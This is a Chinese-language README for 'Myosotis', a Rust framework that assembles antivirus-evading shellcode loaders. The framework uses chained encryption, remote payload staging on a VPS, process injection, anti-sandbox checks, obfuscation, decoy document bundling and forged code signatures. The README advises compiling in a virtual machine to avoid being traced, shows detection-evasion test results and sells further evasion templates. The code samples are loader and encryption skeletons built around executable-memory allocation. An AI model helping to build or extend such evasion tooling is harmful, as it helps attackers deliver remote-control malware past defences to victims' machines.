## Myosotis-免杀框架-1.1.0

### 简介

本项目旨在实现免杀模板动态化、私有化，而不是直接提供一键生成免杀项目，需要使用人员本身具有一定的rust语言基础。

通过模块化一个完整loader的各个功能，自动组装模块生成免杀项目；

通过模块导入功能实现模块私有化，增加loader寿命；

添加链式加密后加密方式更加灵活，可交叉生成更多模板，同时加解密模板统一输入输出方便读者自行编写模板导入。

本次更新加入链式加密，通过排列组合可产生的加密链条成几何倍数增加，知识星球内11种加密方式理论上可以产生上亿条加密链条

![图片](https://github.com/user-attachments/assets/6f3c5f49-520a-4b9e-a9b2-f02ac0afb7b4)


### 已知问题

1、首次使用由于rust需要下载库，因此可能卡住几分钟，换源耐心等待即可,加载过的库后续使用就很快了。

2、链式加密可能导致项目失败，推荐使用成熟的加密算法有bug可手动调试项目或提issue。

3、尽管已经去掉项目调试信息，但部分库仍然会将机器路径带到exe中，建议虚拟机编译使用谨防溯源。

### 更新功能

·模板分类

·进程注入路径自定义

·模板导入检测

·链式加密

### 编译环境

环境问题参考网上安装教程即可

`Visual Studio 2022(集成mingw64)`

`rustc 1.83.0 (90b35a623 2024-11-26)`

### 项目结构

```
config:包含用户导入模板以及部分默认功能模板
output：项目输出
output.log:日志方便排查问题
```

### 项目功能

运行主程序选择相关参数，即可在`output`目录下生成`rust`项目，编译好的程序在`\output\随机项目名\target\release\`

考虑到免杀的及时性，项目内仅提供部分基础加密加载模板，有rust基础可自行编写模板，或选择文末加入我的知识星球获取更多模板

```
基础配置：
shellcode：各个远控生成的二进制shellcode(必选)
单体加载：生成单文件exe项目
分离加载：在项目目录下生成encryption.bin,使用时exe直接跟加密文件即可，可重命名
远程加载：填写远程加载url，在项目目录下会生成encryption.bin，然后将encryption.bin放到对应vps即可，文件名和填写的url对应

代码配置：
代码分类用于对部分loader只支持特定系统以及进程注入的路径进行自定义
加载方式：主要是选择执行shellcode的模板(必选)
加密方式：选择对shellcode的加密链，先选先加密（至少选一个）
反虚拟机：反沙箱和分析等，也可以加入自己的小功能(可选、可多选)
花指令：增加代码混淆等(可选、可多选)

其他配置：
图标：exe图标(可选)
捆绑文件：需要释放的word或pdf等(可选)
伪造签名：利用签名复制工具sigthief实现(可选)
```
![图片](https://github.com/user-attachments/assets/b5f97d03-12d9-4b74-9a5c-bc2e4c45cfa4)


模板导入：

模板导入检测功能已更新，简单检测几个关键点,新增加载模板分类，主要为了对进程注入类注入进程进行自定义以及部分加载方式只适合单个架构的方式，如：Early Bird等
![图片](https://github.com/user-attachments/assets/42aa2a14-2bab-4967-9f21-92d3370ebbdf)


### 模板导入说明

模板导入功能主要实现各种轮子的导入，导入模板需要满足下面内容

#### 加解密模板

需要导入`cargo.toml`的除项目信息内容

例：

```toml
[dependencies]
base64 = "0.21"
```

加密模板：

需要导入主要代码，其中加密函数为`pub`且只有这一个`pub`方法，输入`&[u8]`,输入`Vec<u8>`

例：	

```rust
use base64::encode;
use std::fs::File;
use std::io::{self, Read, Write};

pub fn base64_encrypt(input: &[u8]) -> Vec<u8> {
    // 执行 base64 编码
    let encoded = encode(input);
    
    // 返回编码后的字节数组
    encoded.into_bytes()
}
```

解密模板：

需要导入主要代码，其中加密函数为`pub`且只有这一个`pub`方法，输入`&[u8]`,输入`Vec<u8>`

```rust
use base64::decode;
use std::fs::File;
use std::io::{self, Read};

pub fn base64_decrypt_to_shellcode(input_data: &[u8]) -> Vec<u8> {
    // 将 Base64 编码的数据解码为字节数组
    decode(input_data).expect("")
}
```

#### 加载模板

需要导入`cargo.toml`的除项目信息内容

例：

```toml
[dependencies]
winapi = { version = "0.3.9", features = ["memoryapi", "winnt"] }
```

加载代码：

加载代码是唯一需要写main函数的模板，解密函数用`#encryption#`代替，输入字节内容用`#encryption_shellcode#`代替

当选择进程注入类时还需要用`#process_name#`代替进程名

```rust
use std::ptr::null_mut;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};

/// 分配可执行内存并运行 base
unsafe fn execute_base(base: &[u8]) {
//你的加载代码
}
fn main() {
    let base_en: &[u8] =#encryption_shellcode#;
    let base = #encryption#(base_en);
    unsafe {
        execute_base(&base);
    }
}
```

#### 花指令模板和反虚拟机模板

需要导入`cargo.toml`的除项目信息内容

例：

```toml
[dependencies]
rand = "0.8"  # 添加 rand crate 来支持随机数生成
```

代码模板：

只需要实现pub，无输入输出

```rust
use rand::Rng;
use std::{thread, time};

pub fn calculate_pi() -> f64 {
//你的花指令模板和反虚拟机代码
}
```

### 注意事项

模板名称不要包含特殊字符

导入库文件时不要使用换行如下

```rust
use windows_sys::Win32::System::Memory::{
    VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE, PAGE_READWRITE,
};
```

这会导致识别失败，同一个导入只占用一行

### 部分生成模板免杀测试

![图片](https://github.com/user-attachments/assets/c1892c88-c3c7-422d-b43e-9f2c286f1f9b)


![图片](https://github.com/user-attachments/assets/e61cd26c-241d-46ea-ac5f-7a3359559e95)


todo：

日志功能(🐕

动态密钥功能（由于各个加密方式密钥有区别，建议在加密模板中添加生成密钥，然后在解密模板中包含

链式加密模板(🐕

加载模板分类（🐕

系统架构细化处理（🐕

...



### 知识星球

如果你没有rust基础，我的知识星球内提供多个免杀模板和加密模板，并会持续维护，欢迎加入！

![图片](https://github.com/user-attachments/assets/fe92f487-c3e9-4035-adff-24c7a663a10e)


![图片](https://github.com/user-attachments/assets/dc6e00ad-1d63-4b92-9d28-1970e7aa7c0e)


![图片](https://github.com/user-attachments/assets/e9330252-ecd2-4676-b443-2741f993ae13)
